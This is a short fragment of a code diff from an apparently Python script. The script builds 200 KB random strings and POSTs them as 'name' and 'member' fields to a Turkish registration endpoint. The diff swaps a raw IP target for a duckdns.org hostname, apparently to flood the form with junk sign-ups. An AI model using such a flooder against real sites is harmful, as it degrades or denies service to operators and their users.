@@ -7,7 +7,7 @@ def generate_random_data(size):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=size))
 
 def send_post_request():
-    url = "http://77.105.161.26:80/kay%C4%B1tol"
+    url = "http://proxysystem.duckdns.org/kay%C4%B1tol"
     data = {
         'member': '1',
         'name': generate_random_data(200 * 1024), 
